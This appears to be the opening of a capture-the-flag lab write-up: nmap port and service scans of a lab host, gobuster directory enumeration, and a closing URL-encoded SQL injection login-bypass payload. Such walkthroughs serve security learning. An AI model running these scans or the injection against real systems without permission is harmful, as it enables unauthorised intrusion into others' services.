```bash
nmap -p- 10.10.119.161 --min-rate=2000 -vvv
```

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```



```bash
nmap -sC -sV -p22,80 -oN kitty.nmap 10.10.119.161
```

```bash
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b0c569e6dd6b810cda32be41e35b9787 (RSA)
|   256 6c65ad87087a3e4c7dea3a30764d0416 (ECDSA)
|_  256 2d571d56f6565229eaaada33b2772c9c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
```



gobuster
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php -u http://10.10.119.161 -o kitty.gobuster
```

'+or+1%3d1+--+-